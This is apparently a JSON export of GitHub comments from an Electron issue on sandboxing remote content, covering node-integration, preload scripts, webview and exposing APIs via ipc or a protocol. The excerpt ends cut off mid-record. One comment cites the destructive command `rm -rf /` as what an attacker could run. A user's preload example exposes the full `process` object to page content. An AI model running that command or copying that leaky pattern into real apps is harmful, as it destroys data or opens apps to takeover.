[
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104710751",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104710751",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104710751,
    "user": {
      "login": "paulcbetts",
      "id": 1396,
      "avatar_url": "https://avatars1.githubusercontent.com/u/1396?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/paulcbetts",
      "html_url": "https://github.com/paulcbetts",
      "followers_url": "https://api.github.com/users/paulcbetts/followers",
      "following_url": "https://api.github.com/users/paulcbetts/following{/other_user}",
      "gists_url": "https://api.github.com/users/paulcbetts/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/paulcbetts/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/paulcbetts/subscriptions",
      "organizations_url": "https://api.github.com/users/paulcbetts/orgs",
      "repos_url": "https://api.github.com/users/paulcbetts/repos",
      "events_url": "https://api.github.com/users/paulcbetts/events{/privacy}",
      "received_events_url": "https://api.github.com/users/paulcbetts/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T16:46:20Z",
    "updated_at": "2015-05-22T16:47:13Z",
    "body": "You are missing the WebView tag, which allows you to sandbox remote content: https://github.com/atom/electron/blob/master/docs/api/web-view-tag.md. You can use a `preload` script to set up a set of APIs that are available to the guest content that has access to node, but once the page starts loading that content will only have access to what you have provided\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104719179",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104719179",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104719179,
    "user": {
      "login": "arturadib",
      "id": 741528,
      "avatar_url": "https://avatars2.githubusercontent.com/u/741528?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/arturadib",
      "html_url": "https://github.com/arturadib",
      "followers_url": "https://api.github.com/users/arturadib/followers",
      "following_url": "https://api.github.com/users/arturadib/following{/other_user}",
      "gists_url": "https://api.github.com/users/arturadib/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/arturadib/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/arturadib/subscriptions",
      "organizations_url": "https://api.github.com/users/arturadib/orgs",
      "repos_url": "https://api.github.com/users/arturadib/repos",
      "events_url": "https://api.github.com/users/arturadib/events{/privacy}",
      "received_events_url": "https://api.github.com/users/arturadib/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T17:19:14Z",
    "updated_at": "2015-05-22T17:19:14Z",
    "body": "Ha, didn't know about `preload`. It looks like `BrowserWindow` takes a `preload` param too, so it seems we could even run the whole window with `node-integration: false`, and just expose the necessary APIs via a `preload` script.\n\nCan y'all think of other security risks with this?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104719851",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104719851",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104719851,
    "user": {
      "login": "paulcbetts",
      "id": 1396,
      "avatar_url": "https://avatars1.githubusercontent.com/u/1396?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/paulcbetts",
      "html_url": "https://github.com/paulcbetts",
      "followers_url": "https://api.github.com/users/paulcbetts/followers",
      "following_url": "https://api.github.com/users/paulcbetts/following{/other_user}",
      "gists_url": "https://api.github.com/users/paulcbetts/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/paulcbetts/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/paulcbetts/subscriptions",
      "organizations_url": "https://api.github.com/users/paulcbetts/orgs",
      "repos_url": "https://api.github.com/users/paulcbetts/repos",
      "events_url": "https://api.github.com/users/paulcbetts/events{/privacy}",
      "received_events_url": "https://api.github.com/users/paulcbetts/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T17:21:50Z",
    "updated_at": "2015-05-22T17:21:50Z",
    "body": "The only other risk is being careful how you store variables, if you save off `process` as a property of a class you expose to the guest, you've effectively defeated the protection that WebView provides. If you _really_ need to hide something, you can use `v8util`'s `get/setHiddenValue`: https://github.com/atom/electron/blob/e98953a5a563648a69b6cb8535d1f27febeec887/atom/renderer/api/lib/ipc.coffee#L5\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104720787",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104720787",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104720787,
    "user": {
      "login": "arturadib",
      "id": 741528,
      "avatar_url": "https://avatars2.githubusercontent.com/u/741528?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/arturadib",
      "html_url": "https://github.com/arturadib",
      "followers_url": "https://api.github.com/users/arturadib/followers",
      "following_url": "https://api.github.com/users/arturadib/following{/other_user}",
      "gists_url": "https://api.github.com/users/arturadib/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/arturadib/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/arturadib/subscriptions",
      "organizations_url": "https://api.github.com/users/arturadib/orgs",
      "repos_url": "https://api.github.com/users/arturadib/repos",
      "events_url": "https://api.github.com/users/arturadib/events{/privacy}",
      "received_events_url": "https://api.github.com/users/arturadib/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T17:27:02Z",
    "updated_at": "2015-05-22T17:27:02Z",
    "body": "I'm thinking the most secure solution is to block off `node-integration` in the browser window altogether and offer up the API through a protocol e.g. `myapp://`. Seems like this has the smallest attack surface?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104755441",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104755441",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104755441,
    "user": {
      "login": "paulcbetts",
      "id": 1396,
      "avatar_url": "https://avatars1.githubusercontent.com/u/1396?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/paulcbetts",
      "html_url": "https://github.com/paulcbetts",
      "followers_url": "https://api.github.com/users/paulcbetts/followers",
      "following_url": "https://api.github.com/users/paulcbetts/following{/other_user}",
      "gists_url": "https://api.github.com/users/paulcbetts/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/paulcbetts/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/paulcbetts/subscriptions",
      "organizations_url": "https://api.github.com/users/paulcbetts/orgs",
      "repos_url": "https://api.github.com/users/paulcbetts/repos",
      "events_url": "https://api.github.com/users/paulcbetts/events{/privacy}",
      "received_events_url": "https://api.github.com/users/paulcbetts/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T20:02:35Z",
    "updated_at": "2015-05-22T20:02:35Z",
    "body": "Seems like overkill to me\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104756337",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104756337",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104756337,
    "user": {
      "login": "arturadib",
      "id": 741528,
      "avatar_url": "https://avatars2.githubusercontent.com/u/741528?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/arturadib",
      "html_url": "https://github.com/arturadib",
      "followers_url": "https://api.github.com/users/arturadib/followers",
      "following_url": "https://api.github.com/users/arturadib/following{/other_user}",
      "gists_url": "https://api.github.com/users/arturadib/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/arturadib/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/arturadib/subscriptions",
      "organizations_url": "https://api.github.com/users/arturadib/orgs",
      "repos_url": "https://api.github.com/users/arturadib/repos",
      "events_url": "https://api.github.com/users/arturadib/events{/privacy}",
      "received_events_url": "https://api.github.com/users/arturadib/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T20:06:35Z",
    "updated_at": "2015-05-22T20:06:35Z",
    "body": "Why is it an overkill, Electron's protocol API is pretty trivial.. Also ain't no such thing as an overkill when the risk is running untrusted code with full Node core access!\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104760992",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104760992",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104760992,
    "user": {
      "login": "baconbrad",
      "id": 4763342,
      "avatar_url": "https://avatars1.githubusercontent.com/u/4763342?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/baconbrad",
      "html_url": "https://github.com/baconbrad",
      "followers_url": "https://api.github.com/users/baconbrad/followers",
      "following_url": "https://api.github.com/users/baconbrad/following{/other_user}",
      "gists_url": "https://api.github.com/users/baconbrad/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/baconbrad/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/baconbrad/subscriptions",
      "organizations_url": "https://api.github.com/users/baconbrad/orgs",
      "repos_url": "https://api.github.com/users/baconbrad/repos",
      "events_url": "https://api.github.com/users/baconbrad/events{/privacy}",
      "received_events_url": "https://api.github.com/users/baconbrad/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-22T20:35:09Z",
    "updated_at": "2015-05-22T20:35:09Z",
    "body": "I think he is talking more of the lines of blacklisting everything from using it and only certain things can use it once whitelisted. Kind of like [how NW.js integrates it](https://github.com/nwjs/nw.js/wiki/Manifest-format#node-remote).\n\nIn the meantime if your web app does not need to use node at all you can use the web view tag as if it where an Iframe. Make it 100% width and height and have your app run in there. Otherwise I think node.js on the front end needs to be handled just like node.js on the back end where you the developer of the app needs to take responsibility in not letting it happen through methods of sanitation, etc. Kinda like an electrician needing to act like all wires could be hot. We need to act like all exploits could be possible.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/104820380",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-104820380",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 104820380,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2015-05-23T02:33:27Z",
    "updated_at": "2015-05-23T02:33:27Z",
    "body": "Related issue: https://github.com/atom/atom/issues/1763, we also have a [GSoC project](https://github.com/github/gsoc#implement-secure-native-node-modules) on this.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/106417969",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-106417969",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 106417969,
    "user": {
      "login": "maxkueng",
      "id": 168709,
      "avatar_url": "https://avatars2.githubusercontent.com/u/168709?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/maxkueng",
      "html_url": "https://github.com/maxkueng",
      "followers_url": "https://api.github.com/users/maxkueng/followers",
      "following_url": "https://api.github.com/users/maxkueng/following{/other_user}",
      "gists_url": "https://api.github.com/users/maxkueng/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/maxkueng/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/maxkueng/subscriptions",
      "organizations_url": "https://api.github.com/users/maxkueng/orgs",
      "repos_url": "https://api.github.com/users/maxkueng/repos",
      "events_url": "https://api.github.com/users/maxkueng/events{/privacy}",
      "received_events_url": "https://api.github.com/users/maxkueng/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-28T15:36:02Z",
    "updated_at": "2015-05-28T15:48:33Z",
    "body": "@arturadib:\n\n> It looks like BrowserWindow takes a preload param too, so it seems we could even run the whole window with node-integration: false, and just expose the necessary APIs via a preload script.\n\nThe [WebView documentation](https://github.com/atom/electron/blob/master/docs/api/web-view-tag.md#preload) says:\n\n> When the guest page doesn't have node integration this script will still have access to all Node APIs, **but global objects injected by Node will be deleted after this script has done execution**.\n\nI assume `BrowserWindow` works the same? So this doesn't work. I even tried injecting a preload script that exposes an object like this: `window.something = { an: 'object', withSome: function s () {} };` but if I turn off `node-integration` the object is isn't available to the page.\n\nPreload scripts would be a cool way to expose an API to the content page but turn off access to any other Electron APIs. It would also resolve `require` conflicts.\n\n**Edit**: I've just made an interesting discovery.\n\nThis doesn't work:\n\n``` js\nvar myApi = { an: 'object', withSome: function s () {} };\n```\n\nThis also doesn't work:\n\n``` js\nwindow.myApi = { an: 'object', withSome: function s () {} };\n```\n\nBut this works (no `var` statement) partially:\n\n``` js\nmyApi = { an: 'object', withSome: function s () {} };\n```\n\nThe `myApi` object is available to the content but when the preload script tries to access an Electron global it can't access it:\n\n``` js\n// preload script\nmyApi = {\n  crash: function () {\n    process.crash();\n  }\n};\n\n// content\nmyApi.crash();\n```\n\n`myApi.crash();` dies with \"Uncaught ReferenceError: process is not defined\".\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/106827531",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-106827531",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 106827531,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2015-05-29T14:26:24Z",
    "updated_at": "2015-05-29T14:26:24Z",
    "body": "By the time `preload` script is loaded, `window` object is not ready yet, you can use `global.myApi` instead.\n\nFor the `process` object, you should keep a local reference of `process` in the script because the global one would be deleted then:\n\n``` js\nvar process = global.process;\n```\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/107032345",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-107032345",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 107032345,
    "user": {
      "login": "maxkueng",
      "id": 168709,
      "avatar_url": "https://avatars2.githubusercontent.com/u/168709?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/maxkueng",
      "html_url": "https://github.com/maxkueng",
      "followers_url": "https://api.github.com/users/maxkueng/followers",
      "following_url": "https://api.github.com/users/maxkueng/following{/other_user}",
      "gists_url": "https://api.github.com/users/maxkueng/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/maxkueng/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/maxkueng/subscriptions",
      "organizations_url": "https://api.github.com/users/maxkueng/orgs",
      "repos_url": "https://api.github.com/users/maxkueng/repos",
      "events_url": "https://api.github.com/users/maxkueng/events{/privacy}",
      "received_events_url": "https://api.github.com/users/maxkueng/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-30T12:09:23Z",
    "updated_at": "2015-05-30T12:09:23Z",
    "body": "Thank you.\n\nI'm doing something like that now that works well. Storing `process` in `atom.process` keeps it available within the preload script but since the `atom` uses the `var` statement it doesn't expose it to the rest of the app. It's pretty cool.\n\n``` js\n// preload script\nvar atom = {\n  process: process,\n  // ... more things\n};\n\nmyApi = {\n  crash: function () {\n    atom.process.crash();\n  }\n};\n\n// content\nmyApi.crash();\n```\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/107067218",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-107067218",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 107067218,
    "user": {
      "login": "arturadib",
      "id": 741528,
      "avatar_url": "https://avatars2.githubusercontent.com/u/741528?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/arturadib",
      "html_url": "https://github.com/arturadib",
      "followers_url": "https://api.github.com/users/arturadib/followers",
      "following_url": "https://api.github.com/users/arturadib/following{/other_user}",
      "gists_url": "https://api.github.com/users/arturadib/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/arturadib/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/arturadib/subscriptions",
      "organizations_url": "https://api.github.com/users/arturadib/orgs",
      "repos_url": "https://api.github.com/users/arturadib/repos",
      "events_url": "https://api.github.com/users/arturadib/events{/privacy}",
      "received_events_url": "https://api.github.com/users/arturadib/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-05-30T17:14:15Z",
    "updated_at": "2015-05-30T17:14:15Z",
    "body": "The `preload` security model is pretty fragile – as pointed out above, you need to keep a reference to the necessary Node APIs in the exposed objects, so it puts a large burden on developers to ensure those references don't leak. All it takes is one slip for an attacker to run `rm -rf /` on your users' machines...\n\nI'm still thinking the safest solution is to only expose non-web APIs through the protocol API.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/137862558",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-137862558",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 137862558,
    "user": {
      "login": "gruebait",
      "id": 8439245,
      "avatar_url": "https://avatars2.githubusercontent.com/u/8439245?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/gruebait",
      "html_url": "https://github.com/gruebait",
      "followers_url": "https://api.github.com/users/gruebait/followers",
      "following_url": "https://api.github.com/users/gruebait/following{/other_user}",
      "gists_url": "https://api.github.com/users/gruebait/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/gruebait/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/gruebait/subscriptions",
      "organizations_url": "https://api.github.com/users/gruebait/orgs",
      "repos_url": "https://api.github.com/users/gruebait/repos",
      "events_url": "https://api.github.com/users/gruebait/events{/privacy}",
      "received_events_url": "https://api.github.com/users/gruebait/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-09-04T21:50:42Z",
    "updated_at": "2015-09-04T22:01:06Z",
    "body": "Agree with @arturadib; anything less here is playing with fire. It also may be unwise to assume future devs will be \"security conscious\" in any way, shape, or form. The more popular Electron becomes, the more dangerous that assumption becomes. IMO the simple best solution here is max security by default, with explicit alternatives for developers who need more power.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/137870561",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-137870561",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 137870561,
    "user": {
      "login": "paulcbetts",
      "id": 1396,
      "avatar_url": "https://avatars1.githubusercontent.com/u/1396?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/paulcbetts",
      "html_url": "https://github.com/paulcbetts",
      "followers_url": "https://api.github.com/users/paulcbetts/followers",
      "following_url": "https://api.github.com/users/paulcbetts/following{/other_user}",
      "gists_url": "https://api.github.com/users/paulcbetts/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/paulcbetts/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/paulcbetts/subscriptions",
      "organizations_url": "https://api.github.com/users/paulcbetts/orgs",
      "repos_url": "https://api.github.com/users/paulcbetts/repos",
      "events_url": "https://api.github.com/users/paulcbetts/events{/privacy}",
      "received_events_url": "https://api.github.com/users/paulcbetts/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-09-04T22:22:48Z",
    "updated_at": "2015-09-04T22:22:48Z",
    "body": "> IMO the simple best solution here is max security by default, with explicit alternatives for developers who need more power.\n\nThe simplest best solution is to not run remote content at all and only load local content. \n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/137962287",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-137962287",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 137962287,
    "user": {
      "login": "arturadib",
      "id": 741528,
      "avatar_url": "https://avatars2.githubusercontent.com/u/741528?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/arturadib",
      "html_url": "https://github.com/arturadib",
      "followers_url": "https://api.github.com/users/arturadib/followers",
      "following_url": "https://api.github.com/users/arturadib/following{/other_user}",
      "gists_url": "https://api.github.com/users/arturadib/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/arturadib/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/arturadib/subscriptions",
      "organizations_url": "https://api.github.com/users/arturadib/orgs",
      "repos_url": "https://api.github.com/users/arturadib/repos",
      "events_url": "https://api.github.com/users/arturadib/events{/privacy}",
      "received_events_url": "https://api.github.com/users/arturadib/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-09-05T14:50:25Z",
    "updated_at": "2015-09-05T14:50:25Z",
    "body": "> The simplest best solution is to not run remote content at all and only load local content.\n\nIt's not about deliberately running remote content. It's about _accidentally_ running remote content. For example, a chat app may be entirely written locally, but it still needs to display remote content.\n\nIn this case, do we really want to make the user's entire security depend on the escaping of content, or do we want to borrow hard lessons learned from the database world where escaping–just in case it's missed–is also accompanied by restrictive access to ensure queries only have the absolute necessary permissions?\n\nThe current security model for exposing main process APIs to the renderer process (i.e. `preload` scripts) is fragile because it puts a large burden on developers to ensure main process objects don't leak, such as `fs`, etc.\n\nA much more robust model is to only expose e.g. `ipc` to the preload script. That way the only thing that can possibly leak is `ipc` itself, which minimizes the surface of attack to only those remote procedures actually implemented by the developer on the main process.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/138051441",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-138051441",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 138051441,
    "user": {
      "login": "zcbenz",
      "id": 639601,
      "avatar_url": "https://avatars3.githubusercontent.com/u/639601?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/zcbenz",
      "html_url": "https://github.com/zcbenz",
      "followers_url": "https://api.github.com/users/zcbenz/followers",
      "following_url": "https://api.github.com/users/zcbenz/following{/other_user}",
      "gists_url": "https://api.github.com/users/zcbenz/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/zcbenz/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/zcbenz/subscriptions",
      "organizations_url": "https://api.github.com/users/zcbenz/orgs",
      "repos_url": "https://api.github.com/users/zcbenz/repos",
      "events_url": "https://api.github.com/users/zcbenz/events{/privacy}",
      "received_events_url": "https://api.github.com/users/zcbenz/received_events",
      "type": "User",
      "site_admin": true
    },
    "created_at": "2015-09-06T08:03:46Z",
    "updated_at": "2015-09-06T08:03:46Z",
    "body": "> The current security model for exposing main process APIs to the renderer process (i.e. preload scripts) is fragile because it puts a large burden on developers to ensure main process objects don't leak, such as fs, etc.\n\nThe symbols exposed in `preload` script do not leak to the page unless you explicitly do that by storing the symbols to `window`, I think it is not a so large burden?\n\nOnly exposing `ipc` module is not 100% secure too, the `remote` module is implemented with `ipc` under the hood, and if you can control which messages are sent to the main process, you are able to control everything.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/157400605",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-157400605",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 157400605,
    "user": {
      "login": "matthiasg",
      "id": 231889,
      "avatar_url": "https://avatars1.githubusercontent.com/u/231889?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/matthiasg",
      "html_url": "https://github.com/matthiasg",
      "followers_url": "https://api.github.com/users/matthiasg/followers",
      "following_url": "https://api.github.com/users/matthiasg/following{/other_user}",
      "gists_url": "https://api.github.com/users/matthiasg/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/matthiasg/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/matthiasg/subscriptions",
      "organizations_url": "https://api.github.com/users/matthiasg/orgs",
      "repos_url": "https://api.github.com/users/matthiasg/repos",
      "events_url": "https://api.github.com/users/matthiasg/events{/privacy}",
      "received_events_url": "https://api.github.com/users/matthiasg/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-11-17T15:18:21Z",
    "updated_at": "2015-11-17T15:18:21Z",
    "body": "@zcbenz how do i expose something to window ? i though the window object isnt ready at the time the preload script runs ?\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/157409572",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-157409572",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 157409572,
    "user": {
      "login": "matthiasg",
      "id": 231889,
      "avatar_url": "https://avatars1.githubusercontent.com/u/231889?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/matthiasg",
      "html_url": "https://github.com/matthiasg",
      "followers_url": "https://api.github.com/users/matthiasg/followers",
      "following_url": "https://api.github.com/users/matthiasg/following{/other_user}",
      "gists_url": "https://api.github.com/users/matthiasg/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/matthiasg/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/matthiasg/subscriptions",
      "organizations_url": "https://api.github.com/users/matthiasg/orgs",
      "repos_url": "https://api.github.com/users/matthiasg/repos",
      "events_url": "https://api.github.com/users/matthiasg/events{/privacy}",
      "received_events_url": "https://api.github.com/users/matthiasg/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-11-17T15:47:10Z",
    "updated_at": "2015-11-17T15:47:10Z",
    "body": "ok .. it seems the wiki is unclear. The parameter is not yet webPreferences but web-preferences and its not preload but preload-url as stated.\n\nso it works with:\n\n```\n  mainWindow = new BrowserWindow({\n    width: 800,\n    height: 600,\n    'web-preferences': {\n      'node-integration': false,\n      'preload-url': 'file://' + path.join(__dirname, 'expose-window-apis.js')\n    }\n  });\n```\n\nexpose-window-apis.js\n\n```\nvar hostProcess = process;\nvar hostRequire = require;\n\nprocess.once('loaded', function(){\n\n  global.host = {\n    process: hostProcess,\n    crash: function () {\n      hostProcess.crash();\n    },\n  };\n\n  global.host.ipc = hostRequire('ipc');   \n});\n\n```\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/157414696",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-157414696",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 157414696,
    "user": {
      "login": "etiktin",
      "id": 4381579,
      "avatar_url": "https://avatars1.githubusercontent.com/u/4381579?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/etiktin",
      "html_url": "https://github.com/etiktin",
      "followers_url": "https://api.github.com/users/etiktin/followers",
      "following_url": "https://api.github.com/users/etiktin/following{/other_user}",
      "gists_url": "https://api.github.com/users/etiktin/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/etiktin/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/etiktin/subscriptions",
      "organizations_url": "https://api.github.com/users/etiktin/orgs",
      "repos_url": "https://api.github.com/users/etiktin/repos",
      "events_url": "https://api.github.com/users/etiktin/events{/privacy}",
      "received_events_url": "https://api.github.com/users/etiktin/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-11-17T16:05:06Z",
    "updated_at": "2015-11-17T16:05:06Z",
    "body": "@matthiasg the docs are for the current master branch and in v0.35.0 the option names changed, so if you're using an older version you need to use the dashed options. To find the docs for your version just edit the following url and replace v0.34.3 with your version:\nhttps://github.com/atom/electron/tree/v0.34.3/docs\n\nYou don't need to use `preload-url`, use `preload` and pass it the absolute path to your script and not a file url. So in your case it should be `'preload': path.join(__dirname, 'expose-window-apis.js')`.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/157655459",
    "html_url": "https://github.com/electron/electron/issues/1753#issuecomment-157655459",
    "issue_url": "https://api.github.com/repos/electron/electron/issues/1753",
    "id": 157655459,
    "user": {
      "login": "matthiasg",
      "id": 231889,
      "avatar_url": "https://avatars1.githubusercontent.com/u/231889?v=3",
      "gravatar_id": "",
      "url": "https://api.github.com/users/matthiasg",
      "html_url": "https://github.com/matthiasg",
      "followers_url": "https://api.github.com/users/matthiasg/followers",
      "following_url": "https://api.github.com/users/matthiasg/following{/other_user}",
      "gists_url": "https://api.github.com/users/matthiasg/gists{/gist_id}",
      "starred_url": "https://api.github.com/users/matthiasg/starred{/owner}{/repo}",
      "subscriptions_url": "https://api.github.com/users/matthiasg/subscriptions",
      "organizations_url": "https://api.github.com/users/matthiasg/orgs",
      "repos_url": "https://api.github.com/users/matthiasg/repos",
      "events_url": "https://api.github.com/users/matthiasg/events{/privacy}",
      "received_events_url": "https://api.github.com/users/matthiasg/received_events",
      "type": "User",
      "site_admin": false
    },
    "created_at": "2015-11-18T09:30:29Z",
    "updated_at": "2015-11-18T09:30:29Z",
    "body": "@etiktin thanks that works too.\n"
  },
  {
    "url": "https://api.github.com/repos/electron/electron/issues/comments/167565891",
